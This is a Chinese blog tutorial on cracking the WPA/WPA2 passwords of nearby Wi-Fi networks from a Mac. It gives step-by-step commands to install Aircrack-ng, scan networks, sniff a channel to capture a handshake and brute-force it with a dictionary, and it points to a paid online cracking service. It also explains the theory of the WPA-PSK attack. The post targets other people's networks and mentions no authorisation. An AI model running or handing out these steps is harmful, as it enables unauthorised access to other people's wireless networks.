# [Mac系统安装Aircrack-ng破解附近wifi密码(1)](https://www.cnblogs.com/diligenceday/p/6344487.html)



**阅读目录**

- [　　第一步， 安装macport， 安装Xcode](https://www.cnblogs.com/diligenceday/p/6344487.html#_label0)
- [　　第二步， 安装aircrack-ng](https://www.cnblogs.com/diligenceday/p/6344487.html#_label1)
- [　　第三步， 获取当前网卡](https://www.cnblogs.com/diligenceday/p/6344487.html#_label2)
- [　　第四步， 获取所有的无线网络](https://www.cnblogs.com/diligenceday/p/6344487.html#_label3)
- [　　第五步，开始抓包 ， 收集监听周围无线网络的数据](https://www.cnblogs.com/diligenceday/p/6344487.html#_label4)
- [　　第六步， 查看cap文件中的数据是否被抓取到](https://www.cnblogs.com/diligenceday/p/6344487.html#_label5)
- [　　第七步， 输入命令air-crack开始破解](https://www.cnblogs.com/diligenceday/p/6344487.html#_label6)
- [　　WPA/WPA2简介](https://www.cnblogs.com/diligenceday/p/6344487.html#_label7)
- [　　WPA-PSK安全漏洞](https://www.cnblogs.com/diligenceday/p/6344487.html#_label8)
- [　　WPA-PSK攻击原理](https://www.cnblogs.com/diligenceday/p/6344487.html#_label9)
- [　　WPA-PSK攻击难点](https://www.cnblogs.com/diligenceday/p/6344487.html#_label10)
- [　　相关：](https://www.cnblogs.com/diligenceday/p/6344487.html#_label11)
- [　　参考：](https://www.cnblogs.com/diligenceday/p/6344487.html#_label12)

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　第一步， 安装macport， 安装Xcode

　　安装**[macport](https://www.macports.org/install.php) macport** 是一个工具 管理软件包的一个工具， 我们也可以通过别的方式安装**Aircrack-ng**， 但是通过macport安装Aircrack-ng的速度是最快的， （Mac系统要求安装Xcode, 可以参考macport的首页）

　　macport没安装的话通过：https://www.macports.org/install.php 先安装好

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　第二步， 安装aircrack-ng

通过shell命令行执行：

运行下面代码

```
sudo port install aircrack-ng

//没有port 也可以使用brew
sudo brew install aircrack-ng
```

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　第三步， 获取当前网卡

　　**通过ifconfig命令**获取当前的网卡的名字， 我这边**网卡名字为en0**：

![img](https://images2015.cnblogs.com/blog/497865/201701/497865-20170108224909253-1364100805.png)

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　第四步， 获取所有的无线网络

　　　　使用**mac**系统自带的**airport**工具， 查看当前的无线网络， 以及它们的相关信息，在**shell**中执行：

运行下面代码

```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s

airport -s
```

　　　　系统回显如下图， 以下为我附近所有的**wifi**， 注意看表格， **SSID**， **BSSID**， **CHANNEL**，这些关键词都会在后面提到：

![img](https://images2015.cnblogs.com/blog/497865/201701/497865-20170108231606300-2051530026.png)

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 第五步，开始抓包 ， 收集监听周围无线网络的数据

　　　　参数**en0**是我电脑的默认网卡， 数字6是网卡需要监听的网络频道:

运行下面代码

```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 6
```

　　当执行以上命令， 开始监听以后， **wifi**的图标会**发生改变**， 变成一个小眼睛一样的图标：

![img](https://images2015.cnblogs.com/blog/497865/201701/497865-20170108232218441-1459515906.png)

　　监听久一点， 然后使用**ctrl+c**停止监听， 系统会把监听到的数据保存到本地， 如下图， 数据保存到**/tmp/airportSniffdaMCjH.cap** 文件中：

![img](https://images2015.cnblogs.com/blog/497865/201701/497865-20170108231500300-323707699.png)

　　在监听的过程中如果有用户登陆这个wifi， 那么包就会被我们截获， 如果用户一直没有登陆到这个wifi， 我们就还要继续等待监听， 尽量在手机或者手提电脑所用高峰期开启捕获， 这样捕获**握手（handshake）**的几率比较高， 具体原理参考最后的链接；

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 第六步， 查看cap文件中的数据是否被抓取到

　　　　输入命令：

运行下面代码

```
sudo aircrack-ng   /tmp/airportSniff8g0Oex.cap 
```

　　如果要查询的路由列表的**Encryption**值为**WPA(1 handshake)** ，说明抓取成功， 否者跳到**第六步**，要重新抓取：

![img](https://images2015.cnblogs.com/blog/497865/201701/497865-20170109004808347-279567019.png)

 

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　第七步， 输入命令air-crack开始破解

-b后面的参数bc:46:99:df:6c:72指的是网卡的**BSSID**， 最后面的一个文件路径是上一步监听到的数据

运行下面代码

```
sudo aircrack-ng -w dict.txt -b bc:46:99:df:6c:72 /tmp/airportSniffdaMCjH.cap
```

　　只要字典够大， 密码破出来应该指日可待， 字典可以自己去做，或者网上下载

　　能不能破解主要看脸， 看运气

　　破解成功以后，命令行会显示**KEY FOUND** ：

![img](https://images2015.cnblogs.com/blog/497865/201701/497865-20170108234736987-764788628.png)

　如果觉的自己弄个字典爆破很麻烦， 有些第三方的网站提供免费爆破，或者收费的爆破， https://gpuhash.me/

# 　　WPA/WPA2简介

　　由于WEP中存在严重的安全漏洞，WIFI联盟制定了WPA和WPA2以取代WEP。其中WPA实现了802.11i的主要部分，提供了对现有硬件的向下兼容，被用来作为WEP到802.11i的过渡。之后的则WPA2完整的实现了整个IEEE 802.1i标准。
WPA的根据应用场景的不同采用不同的认证方式，其中面对家庭或小型办公场所网络的WPA-PSK不需要专门的认证服务器，所有该网络中的设备通过使用同一个256-bit的密钥来进行认证。



# 　　WPA-PSK安全漏洞

　　WPA-PSK认证中的四次握手被设计用来在不安全的信道中，通过明文传输的方式来进行一定程度上的认证，并且在设备之间建立安全信道。首先，**PSK会被转化为PMK**，**而PMK则在接下来被用于生成PTK**。PTK则会被分为若干部分，**其中一部分被称作MIC Key**，用来生成每一个包的Hash值来用于验证。
WPA的安全问题与其认证过程所使用的算法关系不大，更多的是由于这一过程可以被轻易的重现，这就使得WPA-PSK可能遭受字典暴力攻击。



# 　　WPA-PSK攻击原理

　　WPA-PSK攻击分为以下几个步骤：
　　1. 根据passphrase，SSID生成PMK，即PMK = pdkdf2_SHA1(passphrase, SSID, SSID length, 4096)
　　2. 捕获EAPOL四次握手的数据包，得到ANonce，SNonce等信息，用于计算PTK，即
　　PTK = PRF-X(PMK, Len(PMK), “Pairwise key expansion”, Min(AA,SA) || Max(AA,SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce))
　　3. 使用MIC Key计算EAPOL报文的MIC，即MIC = HMAC_MD5(MIC Key, 16, 802.1x data)
　　4. 将计算得到的MIC值与捕获到的MIC值对比，如果相同则破解成功。

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　WPA-PSK攻击难点

　　WPA-PSK攻击的主要难点在于大量计算PMK所需要的计算量。一台普通的计算机通常的计算能力在500pmks/s，想要对8位的纯小写字母组合密码进行暴力破解所需要的时间为14年，所以想要破解WPA－PSK只有两种可能：1.用户使用了常见的弱密码；2.堆砌计算资源，获得超级计算机量级的计算能力。

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　相关：

　　AP(Access Point): 网络接入点，是一种连接无线或有线网络的设备。就是俗称的路由器。

　　MAC(Media Access Control Address): 相当于网卡的身份证，MAC 地址本身是不能修改，但是可以通过伪造MAC 地址欺骗AP。

　　WEP(Wireless Encryption Protocol): 无线加密协议。很早的一种加密协议，容易破解。

　　WPA/WPA2(Wi-FiProtected Access): 基于WEP更安全的加密系统。

　　Handshake:握手。

　　IV(Initialization Vector)s:初始化向量。

[回到顶部](https://www.cnblogs.com/diligenceday/p/6344487.html#_labelTop)

# 　　参考：

　　　　macport：https://www.macports.org/install.php

　　　　使用macbook破解WPA/WPA2 wifi密码：http://topspeedsnail.com/macbook-crack-wifi-with-wpa-wpa2/

　　　　WEP&WPA Cracking on BT5/MAC原理：http://blog.csdn.net/stoneliul/article/details/8836248

　　　　第三方的爆破网站：https://gpuhash.me/ (提供免费的破解， 也提供收费的破解方式， 使用**比特币**作为支付媒介)